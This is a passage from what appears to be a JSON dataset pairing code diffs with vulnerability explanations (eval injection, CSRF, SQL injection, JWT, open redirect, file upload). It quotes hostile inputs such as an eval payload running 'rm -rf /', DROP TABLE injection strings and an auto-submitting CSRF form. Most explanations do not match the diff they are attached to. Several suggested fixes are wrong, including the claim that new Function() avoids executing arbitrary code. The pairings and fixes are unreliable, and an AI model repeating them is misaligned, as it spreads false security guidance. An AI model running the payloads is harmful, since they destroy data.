        "explanation": "Vulnerability Type:\nCWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\n\nProof of Concept:\nThe vulnerable code uses eval(input.extendOutputFunction) to dynamically execute a string from user input. This allows an attacker to supply malicious code like:\n{ \"extendOutputFunction\": \"process.exit()\" }\nwhich will execute immediately when evaluated. Worse payloads can read files, run system commands, or crash the server.\n\nVulnerable Code:\nextendOutputFunction = eval(input.extendOutputFunction);\n\nSeverity:\nLow\n\nRoot Cause:\nThe code directly executes user-controlled input without validation or sanitization. eval() interprets the string as executable JavaScript, leading to possible code injection.\n\nExploit Scenario:\nAn attacker submits malicious JavaScript code inside the extendOutputFunction field. For example:\n\n{ \"extendOutputFunction\": \"require('child_process').exec('rm -rf /')\" }\nThis would execute a shell command, delete server files, or cause serious harm.\n\nWhy It Happens:\nThe vulnerability occurs because eval() executes anything passed into it. Without validating or parsing the input securely, attackers can inject and run arbitrary commands on the server.\n\nSecurity Implications:\nIf exploited, this can lead to Remote Code Execution (RCE), server crashes, data leaks, unauthorized file access, and full compromise of the server or underlying infrastructure.\n\nSuggested Fix:\nReplace eval() with a safer parsing approach using new Function, which treats the input as a function expression without executing arbitrary code:\n\nextendOutputFunction = new Function(`return (${input.extendOutputFunction})`)();\nAlso validate that the result is a real function and properly handle syntax errors."
    },
    "77": {
        "diff": "--- calendar-setup.js\t2024-04-26 12:00:00.000000000 +0530\n+++ calendar-setup.js\t2024-04-26 12:15:00.000000000 +0530\n@@\n-    if (update && p.displayArea)\n-        p.displayArea.innerHTML = cal.date.print(p.daFormat);\n+    if (update && p.displayArea)\n+        p.displayArea.textContent = cal.date.print(p.daFormat);\n@@\n-    if (dateEl)\n-        params.date = Date.parseDate(dateEl.value || dateEl.innerHTML, dateFmt);\n+    if (dateEl)\n+        params.date = Date.parseDate(dateEl.value || dateEl.textContent, dateFmt);\n@@\n-            if (typeof p.flatCallback == \"function\")\n-                p.flatCallback(cal);\n+            if (typeof p.flatCallback == \"function\")\n+                p.flatCallback(cal);\n@@\n-            params.flat = document.getElementById(params.flat);\n+            params.flat = document.getElementById(params.flat);\n@@\n-    if (params.inputField && typeof params.inputField.value == \"string\") {\n-        cal.parseDate(params.inputField.value);\n+    if (params.inputField && typeof params.inputField.value == \"string\") {\n+        cal.parseDate(params.inputField.value);\n@@\n-    if (!params.position)\n-        cal.showAtElement(params.button || params.displayArea || params.inputField, params.align);\n+    if (!params.position)\n+        cal.showAtElement(params.button || params.displayArea || params.inputField, params.align);\n@@\n-    if (update && p.displayArea)\n-        p.displayArea.innerHTML = cal.date.print(p.daFormat);\n+    if (update && p.displayArea)\n+        p.displayArea.textContent = cal.date.print(p.daFormat);\n",
        "explanation": "Vulnerability Type:\nCWE-352: Cross-Site Request Forgery (CSRF)\n\nProof of Concept:\nIn the provided Express application, CSRF protection middleware like csurf is not implemented.\nWithout CSRF tokens, an attacker can trick authenticated users into submitting unintended actions.\n\nExample vulnerable code:\n\njavascript\nCopy\nEdit\napp.use(express.json());\napp.use(express.urlencoded({ extended: true }));\n// No CSRF middleware is used before sensitive routes\napp.use(require('./routes/index'));\nStep-by-Step:\n\nThe app trusts any POST/PUT/DELETE request without verifying its origin.\n\nIf a user is authenticated, a malicious site can send a forged request on their behalf.\n\nThe server processes the action without detecting the forgery.\n\nSeverity:\nHIGH\n\nRoot Cause:\nThe application initializes user sessions and processes incoming HTTP requests without validating them through CSRF tokens.\nWithout CSRF protection middleware, the application cannot distinguish legitimate user requests from forged requests by malicious actors.\n\nExploit Scenario:\nA victim logs into the vulnerable application. While logged in, the victim visits a malicious site that silently triggers a crafted form submission (e.g., deleting their account, changing their email, or making a transaction) without their consent.\n\nExample attack form:\n\nhtml\nCopy\nEdit\n<form action=\"https://vulnerable-app.com/deleteAccount\" method=\"POST\">\n  <input type=\"hidden\" name=\"userId\" value=\"victim_id\">\n</form>\n<script>document.forms[0].submit();</script>\nWhy It Happens:\nThe application accepts incoming state-changing requests (like POST, PUT, DELETE) without requiring a CSRF token, which would validate that the request genuinely came from the user's own session and interface.\n\nSecurity Implications:\nSuccessful exploitation can allow attackers to perform sensitive operations on behalf of users without their consent, such as:\n\nAccount deletion\n\nEmail change\n\nPosting unauthorized content\n\nFund transfer This can lead to severe data breaches, financial loss, and reputational damage to the organization.\n\nSuggested Fix:\nImplement CSRF protection middleware such as csurf:\n\nInitialize csurf after session middleware.\n\nEmbed the CSRF token in every form or AJAX request.\n\nValidate the CSRF token on every incoming state-changing request."
    },
    "114": {
        "diff": "--- a/controllers/review.js\n+++ b/controllers/review.js\n@@\n const Listing = require(\"../models/listing\");\n const Review = require(\"../models/reviews\");\n+const { body, validationResult } = require('express-validator');\n\n module.exports.createReview = async (req, res) => {\n-    try {\n-        let listing = await Listing.findById(req.params.id);\n-        \n-        if (!listing) {\n-            req.flash(\"error\", \"Listing not found.\");\n-            return res.redirect(\"/listings\");\n-        }\n-\n-        let newReview = new Review(req.body.review);\n-        newReview.author = req.user._id;\n-\n-        listing.reviews.push(newReview);\n-        await newReview.save();\n-        await listing.save();\n-\n-        req.flash(\"success\", \"New review created!\");\n-        res.redirect(`/listings/${listing._id}`);    \n-    } \n-    catch (err) {\n-        console.error(err);\n-        req.flash(\"error\", \"An error occurred. Please try again later.\");\n-        res.redirect(\"/listings\");\n-    }\n+    try {\n+        const errors = validationResult(req);\n+        if (!errors.isEmpty()) {\n+            req.flash(\"error\", \"Invalid review input.\");\n+            return res.redirect(\"back\");\n+        }\n+        \n+        const listing = await Listing.findById(req.params.id);\n+        if (!listing) {\n+            req.flash(\"error\", \"Listing not found.\");\n+            return res.redirect(\"/listings\");\n+        }\n+        \n+        const newReview = new Review(req.body.review);\n+        newReview.author = req.user._id;\n+\n+        listing.reviews.push(newReview);\n+        await newReview.save();\n+        await listing.save();\n+\n+        req.flash(\"success\", \"New review created!\");\n+        res.redirect(`/listings/${listing._id}`);\n+    } catch (err) {\n+        console.error(err);\n+        req.flash(\"error\", \"An error occurred. Please try again later.\");\n+        res.redirect(\"/listings\");\n+    }\n };\n\n \n module.exports.destroyReview = async(req,res)=>{\n-    let { id, reviewId } = req.params;\n-    \n-    await Listing.findByIdAndUpdate(id,{ $pull: {\n-        reviews: reviewId\n-    }});\n-    \n-    await Review.findByIdAndDelete(reviewId);\n-    req.flash(\"success\",\"Review deleted!\");\n-\n-    res.redirect(`/listings/${id}`);\n+    try {\n+        const { id, reviewId } = req.params;\n+        \n+        const review = await Review.findById(reviewId);\n+        if (!review) {\n+            req.flash(\"error\", \"Review not found.\");\n+            return res.redirect(`/listings/${id}`);\n+        }\n+\n+        if (!review.author.equals(req.user._id)) {\n+            req.flash(\"error\", \"You are not authorized to delete this review.\");\n+            return res.redirect(`/listings/${id}`);\n+        }\n+\n+        await Listing.findByIdAndUpdate(id, { $pull: { reviews: reviewId } });\n+        await Review.findByIdAndDelete(reviewId);\n+\n+        req.flash(\"success\", \"Review deleted!\");\n+        res.redirect(`/listings/${id}`);\n+    } catch (err) {\n+        console.error(err);\n+        req.flash(\"error\", \"An error occurred. Please try again later.\");\n+        res.redirect(\"/listings\");\n+    }\n };\n+\n+// Add this function in your router validation middleware:\n+module.exports.validateReview = [\n+    body('review.body')\n+        .trim()\n+        .notEmpty().withMessage('Review body must not be empty.')\n+        .escape()\n+];\n",
        "explanation": "Vulnerability Type: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes\n\nProof of Concept:\nVulnerable Code:\nconst result = await super.createOne(data, opts);\nconst result = await super.updateMany(keys, data, opts);\n\n1. The `data` object is passed directly to `super.createOne()` and `super.updateMany()`.\n2. No field validation or sanitization is performed at the service level.\n3. If a user submits unexpected fields like `is_admin`, `system_flags`, or others, they could modify critical system records unintentionally or maliciously.\n4. If the base `ItemsService` does not restrict this either, full privilege escalation is possible.\nSeverity: 4 \u2013 High\nRoot Cause: The AccessService class relies on untrusted input without sanitizing or whitelisting allowed fields, trusting that upstream services will validate the structure. This opens a path for mass assignment attacks by malicious users inserting unauthorized fields.\nExploit Scenario: An attacker sends a crafted payload to the access control endpoints with extra fields, like setting `is_admin: true`, `permissions: \"*\"` during a create or update action. If unfiltered, these fields could be written directly to the database, resulting in unauthorized privilege escalation or broken access control.\nWhy It Happens: This occurs because the service class does not enforce strict server-side validation on incoming `data` objects before interacting with critical internal services. Assumed that upstream input validation was sufficient, leaving the service layer unprotected.\nSecurity Implications: If exploited, attackers could escalate privileges, modify access control roles, delete important system permissions, or even fully compromise the administrative layer of the application. This could result in data exfiltration, unauthorized system control, or destruction of critical app functionality.\nSuggested Fix: Implement strict field-level whitelisting to filter out any unexpected attributes from user-supplied `data` before passing it into `createOne` and `updateMany`. Only explicitly allowed fields (`role`, `collection`, `action`, `permissions`) should be accepted. All other fields must be ignored or rejected."
    },
    "113": {
        "diff": "--- a/src/components/BlogList.js\n+++ b/src/components/BlogList.js\n@@ import { Link } from \"react-router-dom\";\n\n const BlogList = ({ blogs, title, body }) => {\n+  // Safe regex for valid IDs (letters, numbers, dash, underscore only)\n+  const isValidId = (id) => /^[a-zA-Z0-9_-]+$/.test(id);\n\n   return (\n     <div className=\"blog-list\">\n       {blogs.map(blog => (\n-        <div className=\"blog-preview\" key={blog.id}>\n-          <Link to={`blog/${blog.id}`}>\n-            <h2>{ blog.title }</h2>\n-            <p>Written by { blog.author }</p>\n-          </Link>\n-        </div>\n+        <div className=\"blog-preview\" key={blog.id}>\n+          {isValidId(blog.id) ? (\n+            <Link to={`blog/${blog.id}`}>\n+              <h2>{ blog.title }</h2>\n+              <p>Written by { blog.author }</p>\n+            </Link>\n+          ) : (\n+            <div>\n+              <h2>Invalid Blog</h2>\n+              <p>Unsafe blog ID detected</p>\n+            </div>\n+          )}\n+        </div>\n       ))}\n     </div>\n   );\n }\n \n export default BlogList;\n",
        "explanation": "Vulnerability Type:\nCWE-862: Missing Authorization\n\nCWE-915: Improper Input Validation\n\n(Also relates to OWASP A01:2021 - Broken Access Control and OWASP A03:2021 - Injection)\n\nProof of Concept:\nVulnerable Code (Destroy Review):\n\nawait Listing.findByIdAndUpdate(id, { $pull: { reviews: reviewId } });\nawait Review.findByIdAndDelete(reviewId);\nNo check if the current user owns the review before deleting.\n\nAny logged-in user can delete any review if they know its ID.\n\nVulnerable Code (Create Review):\n\nlet newReview = new Review(req.body.review);\nDirectly trusts req.body.review without validating fields.\n\nAttackers can inject MongoDB operators or invalid data.\n\nSeverity:\nHigh\n(Authorization bypass + potential for stored XSS or NoSQL injection.)\n\nRoot Cause:\nThe system does not verify whether the user performing the delete operation is the rightful owner of the review. Additionally, it does not validate or sanitize user-supplied input before saving it to the database, allowing potential injection attacks or corrupted data insertion.\n\nExploit Scenario:\nAn attacker creates a fake account, retrieves a valid reviewId from another user's listing, and sends a forged DELETE request to /listings/:id/reviews/:reviewId. The review, which does not belong to them, gets deleted. Similarly, attackers can submit malformed review data containing $gt or <script> tags to corrupt the database or launch cross-site scripting attacks.\n\nWhy It Happens:\nThe code improperly assumes that any logged-in user is authorized to delete a review and that all incoming review inputs are trustworthy. No ownership checks are performed on sensitive operations, and no input validation mechanisms are used for review creation.\n\nSecurity Implications:\nIf exploited, attackers can delete other users' reviews, leading to loss of user data, undermining trust in the application, and potential defacement. Maliciously crafted reviews could inject JavaScript (XSS) or MongoDB payloads (NoSQL injection), allowing attackers to hijack user sessions or crash the application backend.\n\nSuggested Fix:\nBefore deleting a review, verify that review.author === req.user._id to ensure only the creator can delete their review.\n\nAdd strict server-side validation and sanitization of the review object (e.g., use express-validator).\n\nEscape or strip dangerous HTML from user input to prevent XSS.\n\nUse error handling to prevent crashes from malformed review IDs.\n\nImplement CSRF protection if not already done.\n\nExample ownership check:\n\nconst review = await Review.findById(reviewId);\nif (!review.author.equals(req.user._id)) {\n  req.flash(\"error\", \"Unauthorized to delete this review.\");\n  return res.redirect(`/listings/${id}`);\n}\nExample input validation:\n\nconst { body } = require('express-validator');\nexports.validateReview = [\n  body('review.body').trim().isLength({ min: 1 }).escape()\n];"
    },
    "125": {
        "diff": "diff --git a/saas/api/server/api/public.ts b/saas/api/server/api/public.ts\nindex b3a2d22..f4e123c 100644\n--- a/saas/api/server/api/public.ts\n+++ b/saas/api/server/api/public.ts\n@@\n import * as express from 'express';\n+import { body, validationResult } from 'express-validator';\n\n const router = express.Router();\n\n router.post(\n-  '/get-user-by-slug',\n-  async (req, res, next) => {\n-    console.log('Express route: /get-user-by-slug');\n-\n-    try {\n-      const { slug } = req.body;\n-\n-      const user = await User.getUserBySlug({ slug });\n-\n-      res.json({ user });\n-    } catch (err) {\n-      next(err);\n-    }\n-  }\n+  '/get-user-by-slug',\n+  [\n+    body('slug')\n+      .isString()\n+      .isLength({ min: 1, max: 100 })\n+      .matches(/^[a-zA-Z0-9-_]+$/)\n+      .withMessage('Invalid slug format.'),\n+  ],\n+  async (req, res, next) => {\n+    console.log('Express route: /get-user-by-slug');\n+    const errors = validationResult(req);\n+    if (!errors.isEmpty()) {\n+      return res.status(400).json({ errors: errors.array() });\n+    }\n+    try {\n+      const { slug } = req.body;\n+      const user = await User.getUserBySlug({ slug });\n+      res.json({ user });\n+    } catch (err) {\n+      next(err);\n+    }\n+  }\n );\n",
        "explanation": "Vulnerability Type:\nCWE-347: Improper Verification of Cryptographic Signature\n\nProof of Concept:\nIn the OAuth2Client code:\n\n\njwt.decode(encoded_token, options={'verify_signature': False})\nis used to decode JWT tokens without verifying their signatures.\nThus, any token \u2014 even a forged or tampered one \u2014 would be accepted as valid.\nAn attacker could create arbitrary tokens to impersonate users or escalate privileges without needing the secret key.\n\nSeverity:\nMEDIUM\n\nRoot Cause:\nThe system disables critical JWT signature verification by setting verify_signature=False during token decoding.\nThis flaw allows any unauthorized or tampered JWT token to be accepted, completely bypassing authentication and integrity checks.\n\nExploit Scenario:\nAn attacker crafts a fake JWT token with manipulated scopes or expiry time and submits it to the server.\nSince the signature is not checked, the server accepts the attacker\u2019s token as valid.\nThis could allow the attacker to:\n\nAccess restricted APIs\n\nEscalate privileges\n\nPerform actions as another user.\n\nWhy It Happens:\nThe vulnerability occurs because the application explicitly disables JWT signature verification by configuring options={'verify_signature': False} while decoding tokens.\nThis removes all security provided by JWT and allows any arbitrary, invalid, or forged token to be trusted by the server.\n\nSecurity Implications:\nIf exploited:\n\nAttackers can impersonate legitimate users.\n\nSensitive APIs and resources can be accessed without proper authentication.\n\nSevere data breaches, privilege escalations, and system compromises are possible.\n\nEntire authentication and authorization mechanisms are rendered useless.\n\nSuggested Fix:\nAlways enable JWT signature verification when decoding tokens.\nExplicitly specify the algorithms used (such as 'RS256') to ensure only valid tokens are accepted:\n\n\njwt.decode(encoded_token, algorithms=['RS256'], options={'verify_signature': True})\nSignature verification ensures that the token was generated by a trusted authority and has not been altered."
    },
    "122": {
        "diff": "--- multiChatServer.py\t2025-04-28 09:48:08.000000000 -0400\n+++ multiChatServer-new.py\t2025-04-28 09:48:08.000000000 -0400\n@@ -2,6 +2,7 @@\n \n from socket import AF_INET, socket, SOCK_STREAM\n from threading import Thread\n+from concurrent.futures import ThreadPoolExecutor\n \n clients = {}\n addresses = {}\n@@ -13,6 +14,7 @@\n SOCK = socket(AF_INET, SOCK_STREAM)\n SOCK.bind(ADDR)\n \n+executor = ThreadPoolExecutor(max_workers=50)  # limit to 50 clients\n \n def accept_incoming_connections():\n     \"\"\"Sets up handling for incoming clients.\"\"\"\n@@ -22,7 +24,7 @@\n         client.send(\"Greetings from the ChatRoom! \".encode(\"utf8\"))\n         client.send(\"Now type your name and press enter!\".encode(\"utf8\"))\n         addresses[client] = client_address\n-        Thread(target=handle_client, args=(client, client_address)).start()\n+        executor.submit(handle_client, client, client_address)\n \n \n def handle_client(conn, addr):  # Takes client socket as argument.\n",
        "explanation": "Vulnerability Type:\nCWE-601: URL Redirection to Untrusted Site ('Open Redirect')\nProof of Concept (Elaborated):\nVulnerable Code: [line 4311]\nwindow.location.href = response.url;\nStep-by-Step Explanation:\n1.\tProblem:\nThe application directly trusts and uses response.url to redirect users without validating whether the URL is internal or external.\n2.\tHow to Attack:\nIf an attacker can control or influence response.url, they can:\no\tRedirect users to malicious sites\no\tPerform phishing attacks\no\tSteal user sessions or credentials\n3.\tEffect:\nUsers could be tricked into visiting a malicious third-party website that appears trustworthy because it originated from the legitimate application.\nExample Exploit:\nSuppose the server responds:\n{ \"url\": \"https://evil-attacker.com/login\" }\nThe browser will execute:\nwindow.location.href = \"https://evil-attacker.com/login\";\nResult:\nThe user is redirected to the attacker's malicious page.\nSeverity:\nHigh (Phishing, Account Takeover Risk)\nRoot Cause:\nThe code blindly trusts response.url without validating whether it's safe (i.e., belongs to the same domain or an allowed list).\nExploit Scenario:\nAn attacker submits crafted input that causes the server to respond with a malicious URL.\nWhen a user clicks or triggers the action, they are silently redirected to the attacker\u2019s domain, exposing them to phishing or malware.\nWhy It Happens:\nBecause the server or frontend does not verify that response.url points to a trusted, whitelisted location before redirecting the user.\nSecurity Implications:\nIf exploited:\n\u2022\tUsers lose trust in the application.\n\u2022\tPhishing attacks become easier.\n\u2022\tSensitive data (like passwords, tokens) can be stolen.\n\u2022\tReputation damage for the business.\n\nSuggested Fix:\n--- f88aea41-56e1-43d2-9e80-5735bec3585f.js\t2025-04-27\n+++ f88aea41-56e1-43d2-9e80-5735bec3585f_fixed.js\t2025-04-27\n@@\n- window.location.href = response.url;\n+ const allowedBase = window.location.origin; \n+ const targetUrl = new URL(response.url, allowedBase);\n+ if (targetUrl.origin === allowedBase) {\n+     window.location.href = targetUrl.href;\n+ } else {\n+     console.error('Blocked open redirect attempt to: ', targetUrl.href);\n+ }\n"
    },
    "149": {
        "diff": "--- database.py\t2025-04-29 04:05:24.000000000 -0400\n+++ database-new.py\t2025-04-29 04:05:24.000000000 -0400\n@@ -6,68 +6,74 @@\n DB_FILE = ROOT_DIR / DB_NAME\n TABLE_NAME = \"informacao_clientes\"\n \n-def restart_database():\n-    connection = sqlite3.connect(DB_FILE)\n-    cursor = connection.cursor()\n-    cursor.execute(f\"UPDATE sqlite_sequence SET seq=1 WHERE {TABLE_NAME}\")\n+def validate_table_name(name: str) -> None:\n+    \"\"\"Validate table names to prevent SQL injection\"\"\"\n+    if not name.replace(\"_\", \"\").isalnum():\n+        raise ValueError(f\"Invalid table name: {name}\")\n \n+def restart_database():\n+    validate_table_name(TABLE_NAME)\n+    with sqlite3.connect(DB_FILE) as connection:\n+        cursor = connection.cursor()\n+        cursor.execute(\"UPDATE sqlite_sequence SET seq=1 WHERE name=?\", (TABLE_NAME,))\n \n-def create(NEW_TABLE_NAME):\n+def create(new_table_name: str):\n     global TABLE_NAME\n-    TABLE_NAME = f\"{NEW_TABLE_NAME}\"\n-    connection = sqlite3.connect(DB_FILE)\n-    cursor = connection.cursor()\n-    cursor.execute(f\"CREATE TABLE IF NOT EXISTS {NEW_TABLE_NAME} (id INTEGER PRIMARY KEY AUTOINCREMENT, nome TEXT, sobrenome TEXT)\")\n-    connection.commit()\n-    connection.close()\n-\n-def insert(value,value2):\n-    connection = sqlite3.connect(DB_FILE)\n-    cursor = connection.cursor()\n-    cursor.execute(f\"INSERT INTO {TABLE_NAME} (nome, sobrenome) VALUES (?,?)\", (value,value2))\n-    connection.commit()\n-    connection.close()\n+    validate_table_name(new_table_name)\n+    TABLE_NAME = new_table_name\n+    \n+    with sqlite3.connect(DB_FILE) as connection:\n+        cursor = connection.cursor()\n+        cursor.execute(\n+            \"CREATE TABLE IF NOT EXISTS ? (id INTEGER PRIMARY KEY AUTOINCREMENT, nome TEXT, sobrenome TEXT)\",\n+            (new_table_name,)\n+        )\n+        connection.commit()\n+\n+def insert(nome: str, sobrenome: str):\n+    validate_table_name(TABLE_NAME)\n+    with sqlite3.connect(DB_FILE) as connection:\n+        cursor = connection.cursor()\n+        cursor.execute(\n+            f\"INSERT INTO {TABLE_NAME} (nome, sobrenome) VALUES (?,?)\",\n+            (nome, sobrenome)\n+        )\n+        connection.commit()\n \n def fetch_data():\n-    connection = sqlite3.connect(DB_FILE)\n-    cursor = connection.cursor()\n-    data = cursor.execute(f\"SELECT * FROM {TABLE_NAME}\")\n-    values = data.fetchall()\n-    connection.commit()\n-    connection.close()\n-    return values\n+    validate_table_name(TABLE_NAME)\n+    with sqlite3.connect(DB_FILE) as connection:\n+        cursor = connection.cursor()\n+        cursor.execute(f\"SELECT * FROM {TABLE_NAME}\")\n+        return cursor.fetchall()\n \n def fetch_last_id():\n-    connection = sqlite3.connect(DB_FILE)\n-    cursor = connection.cursor()\n-    id = cursor.execute(f\"SELECT id FROM {TABLE_NAME} ORDER BY id DESC \")\n-    last_id = id.fetchone()[0]\n-    connection.commit()\n-    connection.close()\n-    return last_id\n-\n-\n-def update_value(user_id,new_name,new_surname):\n-    print(user_id)\n-    print(new_name)\n-    print(new_surname)\n-    connection = sqlite3.connect(DB_FILE)\n-    cursor = connection.cursor()\n-    cursor.execute(f\"UPDATE {TABLE_NAME} set nome='{new_name}', sobrenome='{new_surname}' WHERE id={user_id}\")\n-    connection.commit()\n-    connection.close()\n-\n-def delete_value(user_id, user_name):\n-    print(f\"Id: {user_id}\\nNome: {user_name}\")\n-\n-    connection = sqlite3.connect(DB_FILE)\n-    cursor = connection.cursor()\n-    cursor.execute(f\"DELETE FROM {TABLE_NAME} WHERE id={user_id}\")\n-    connection.commit()\n-    connection.close()\n-\n-\n-\n+    validate_table_name(TABLE_NAME)\n+    with sqlite3.connect(DB_FILE) as connection:\n+        cursor = connection.cursor()\n+        cursor.execute(f\"SELECT id FROM {TABLE_NAME} ORDER BY id DESC\")\n+        result = cursor.fetchone()\n+        return result[0] if result else None\n+\n+def update_value(user_id: int, new_name: str, new_surname: str):\n+    validate_table_name(TABLE_NAME)\n+    with sqlite3.connect(DB_FILE) as connection:\n+        cursor = connection.cursor()\n+        cursor.execute(\n+            f\"UPDATE {TABLE_NAME} SET nome=?, sobrenome=? WHERE id=?\",\n+            (new_name, new_surname, user_id)\n+        )\n+        connection.commit()\n+\n+def delete_value(user_id: int, user_name: str):\n+    validate_table_name(TABLE_NAME)\n+    with sqlite3.connect(DB_FILE) as connection:\n+        cursor = connection.cursor()\n+        cursor.execute(\n+            f\"DELETE FROM {TABLE_NAME} WHERE id=?\",\n+            (user_id,)\n+        )\n+        connection.commit()\n \n-if __name__ == \"__database__\":\n-    restart_database()\n\\ No newline at end of file\n+if __name__ == \"__main__\":\n+    restart_database()\n",
        "explanation": "Vulnerability Type:\nCWE-522: Insufficiently Protected Credentials\n(Insufficient Secure Cookie Settings in Session Management)\n\nSeverity:\nVery Low\n\nRoot Cause:\nThe Express application uses express-session without configuring the cookie.secure attribute. By default, cookies are transmitted over both HTTP and HTTPS. Without setting secure: true, session cookies can be intercepted in plaintext over insecure (HTTP) connections, exposing sensitive session IDs to attackers.\n\nExploit Scenario:\nAn attacker connected to the same network as the victim (e.g., public Wi-Fi) intercepts the session cookie transmitted over HTTP (unencrypted). Using the stolen cookie, the attacker can hijack the user\u2019s session, gaining unauthorized access to their authenticated session in the application.\n\nFor example:\n\nVictim logs into the application over http://example.com.\n\nAttacker sniffs the network traffic and retrieves the connect.sid session cookie.\n\nAttacker reuses the session cookie to impersonate the victim.\n\nWhy It Happens:\nThe secure option in express-session ensures that cookies are only sent over HTTPS.\nSince it is missing or not set to true, the browser sends session cookies even over unencrypted HTTP requests, making them vulnerable to Man-in-the-Middle (MitM) attacks.\n\nSecurity Implications:\nSession Hijacking: Unauthorized users can gain control of valid user sessions.\n\nData Breach: Exposing sensitive user information or personal data.\n\nAuthentication Bypass: Attackers can bypass authentication mechanisms entirely by replaying session tokens.\n\nReduced Trust: Users may face account takeover risks, damaging the platform\u2019s reputation.\n\nProof of Concept (PoC):\nObserved Insecure Configuration:\n\n\napp.use(session({\n    secret: 'secret-key',\n    resave: false,\n    saveUninitialized: true\n}));\nThe secure flag for the session cookie is NOT enabled.\n\nResult:\n\nSession cookie (connect.sid) is transmitted in plaintext if accessed over HTTP.\n\nCan be easily captured using tools like Wireshark or Burp Suite on an unsecured network.\n\nSuggested Fix:\nExplicitly set cookie.secure: true in production environments when HTTPS is enabled.\n\nSafe configuration example:\n\n\napp.use(session({\n    secret: 'secret-key',\n    resave: false,\n    saveUninitialized: true,\n    cookie: { secure: process.env.NODE_ENV === 'production' }\n}));\nImportant:\n\nEnsure your server uses HTTPS before enabling secure: true, otherwise cookies won't be set at all.\n\nUse environment variables to dynamically control the secure flag based on deployment."
    },
    "147": {
        "diff": "from fpdf import FPDF\nimport tempfile\n\ndef safe_extract_text(pdf_file):\n    MAX_SIZE = 10 * 1024 * 1024  # 10MB\n    if len(pdf_file.read()) > MAX_SIZE:\n        raise ValueError(\"File too large\")\n    pdf_file.seek(0)\n    \n    if not pdf_file.read(4) == b'%PDF':\n        raise ValueError(\"Invalid PDF\")\n    pdf_file.seek(0)\n    \n    with tempfile.NamedTemporaryFile() as tmp:\n        tmp.write(pdf_file.read())\n        reader = PdfReader(tmp.name)\n        return \"\".join(page.extract_text() for page in reader.pages)",
        "explanation": "Explanation: \nSQL Injection in update_value(): Unsanitized user input in new_name and new_surname parameters allows arbitrary SQL execution.\nSQL Injection in delete_value(): Unsanitized user_id allows SQL injection.\nDynamic Table Name Injection (Multiple Functions): TABLE_NAME is set via create() and used unsafely in fetch_data(), fetch_last_id(), and restart_database().\n\n\nPOC:\nPOC1: update_value(1, \"malicious', sobrenome='hacked\"); DROP TABLE informacao_clientes;--\", \"dummy\")\nPOC2: delete_value(\"1; DROP TABLE informacao_clientes--\", \"dummy\")\nPOC3: create(\"malicious; DROP TABLE informacao_clientes--\")\n\n\nRoot Cause: File --> src/database.py\nLine 42: cursor.execute(f\"UPDATE {TABLE_NAME} set nome='{new_name}', sobrenome='{new_surname}' WHERE id={user_id}\")\nLine 53: cursor.execute(f\"DELETE FROM {TABLE_NAME} WHERE id={user_id}\")\nLine 15: cursor.execute(f\"UPDATE sqlite_sequence SET seq=1 WHERE {TABLE_NAME}\")\nLine 24: cursor.execute(f\"CREATE TABLE IF NOT EXISTS {NEW_TABLE_NAME}...\"\n\n\nExploit Scenario: \nAttackers modify the nome/sobrenome parameters to execute destructive SQL (e.g., DROP TABLE).\nAttacker deletes tables or exfiltrates data.\nAttacker creates tables with malicious names to disrupt queries.\n\n\nWhy It Happens: \nString concatenation without parameterization.\nDirect interpolation of numeric input.\nLack of table name validation.\n\n\nSecurity Implications: \nFull database compromise (data deletion/leakage).\nUnauthorized data deletion.\nQuery disruption or data corruption.\n\n\nSuggested Fix:\n\nPatch1: \ncursor.execute(f\"UPDATE {TABLE_NAME} SET nome=?, sobrenome=? WHERE id=?\", (new_name, new_surname, user_id))\nPatch2:\ncursor.execute(f\"DELETE FROM {TABLE_NAME} WHERE id=?\", (user_id,))\nPatch3:\n# Add allowlist validation\nif not NEW_TABLE_NAME.isidentifier():\n    raise ValueError(\"Invalid table name\")\n"
    },
    "140": {
        "diff": "--- a/app/common.js\n+++ b/app/common.js\n@@ -1,6 +1,7 @@\n import React from 'react';\n import $ from 'jquery';\n import moment from 'moment';\n+import DOMPurify from 'dompurify';\n import { Link } from 'react-router';\n import { converter } from '../constants/constants';\n import Icon from './lib/icon/icon';\n@@ -66,7 +67,9 @@\n             <div\n               className=\"card-content\" dangerouslySetInnerHTML={{\n-                __html: converter.makeHtml(item.content1)\n+                __html: DOMPurify.sanitize(converter.makeHtml(item.content1))\n               }}\n             />\n",
        "explanation": "POC: Unauthorized File Upload Possible\n\nSteps to Reproduce:\nStart the Flask server.\n\nGo directly to /upload endpoint, upload a file without logging in.\n\nFile is accepted and stored on server in ./uploads/.\nVulnerable code: \n@app.route('/data', methods=['GET', 'POST'])\ndef upload_file():\n\nRoot Cause Analysis:\nNo authentication or authorization mechanisms are applied to the file upload endpoint (/data).\nAny user, regardless of their identity or role, can upload files to the server.\nThis opens the application to abuse, such as unauthorized file uploads, storage abuse, and potential injection of malicious files.\nExploit Scenarios:\nUnrestricted file upload (e.g., a .php, .sh, .exe payload).\nAttacker uploads a web shell or malware.\nAbuse of server storage leading to DoS.\n\nWhy This Happens:\nDeveloper forgot to wrap upload routes with authentication verification.\nNo check if session['role'] or a login flag exists.\n\nSecurity Implications:\n1. Remote Code Execution (if server parses uploaded files)\n2. Denial of Service (storage flooding)\n3. Malware Hosting on Your Server\n\nSuggested Fix:\nBefore allowing upload:\n1.Verify session authentication.\n2.Restrict file types strictly.\n3.Sanitize filenames.\nexample:-\n@app.route('/data', methods=['GET', 'POST'])\ndef upload_file():\n    # Ensure the user is authenticated\n    if 'role' not in session or session['role'] not in ['admin', 'user']:\n        flash('Unauthorized access')\n        return redirect('/signin')\n\n    tools.empty_folder('uploads')\n    if request.method == 'POST':\n        # Check if the post request has the file part\n        if 'file' not in request.files:\n            flash('No file part')\n            return redirect(request.url)\n        \n        file = request.files['file']\n        \n        # Validate the filename\n        if file.filename == '':\n            flash('No selected file')\n            return 'NO FILE SELECTED'\n\n        if file and allowed_file(file.filename):\n            try:\n                # Save file securely\n                filename = secure_filename(file.filename)\n                file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))\n                \n                # Log upload details for auditing\n                with open('raw_data/meta_data.txt', 'a') as meta_file:\n                    meta_file.write(filename + '\\n')\n                \n                # Encrypt the file after upload\n                return start_encryption()\n\n            except Exception as e:\n                flash(f\"File upload failed: {str(e)}\")\n                return 'File upload failed'\n        else:\n            flash('Invalid file type')\n            return 'Invalid File Format!'\n    \n    return 'Invalid Request!'\n\n"
    },
    "123": {
